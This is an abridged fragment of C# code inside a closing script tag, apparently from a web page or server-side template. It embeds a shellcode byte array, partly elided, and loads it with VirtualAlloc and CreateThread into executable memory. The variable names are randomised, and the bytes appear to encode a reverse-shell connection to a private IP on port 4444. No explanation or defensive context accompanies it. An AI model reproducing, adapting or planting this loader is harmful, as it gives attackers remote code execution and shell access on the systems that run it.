...
0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x0a,0x10,0x6d,0x68,0x02,0x00,0x11,0x5c,0x89,
...
0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr nz82iECwz = VirtualAlloc(IntPtr.Zero,(UIntPtr)beOhHH.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(beOhHH,0,nz82iECwz,beOhHH.Length);
        IntPtr bt__5yl = IntPtr.Zero;
        IntPtr se_e3ykzjW2B = CreateThread(IntPtr.Zero,UIntPtr.Zero,nz82iECwz,IntPtr.Zero,0,ref bt__5yl);
    }
</script>
